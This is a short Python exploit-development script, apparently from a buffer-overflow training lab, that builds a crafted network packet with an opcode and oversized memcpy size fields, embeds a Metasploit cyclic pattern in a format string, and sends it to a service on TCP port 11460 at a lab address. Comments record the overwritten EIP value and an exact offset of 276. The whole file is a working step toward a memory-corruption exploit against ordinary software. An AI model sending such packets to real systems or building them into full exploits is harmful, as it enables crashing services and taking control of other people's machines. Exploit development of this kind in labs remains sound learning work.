#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

# Results
# eip=41326a41
# pattern = 41 6a 32 41 = Aj2A
# $ msf-pattern_offset -q Aj2A -l 0x200
# [*] Exact match at offset 276

# psAgentCommand
buf = bytearray([0x41] * 0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)  # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41] * 0x8)

# psCommandBuffer
pattern = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(0x200)]).strip())
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (pattern, 0, 0, 0, 0)
buf += formatString

# Checksum
buf = pack(">i", len(buf) - 4) + buf


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()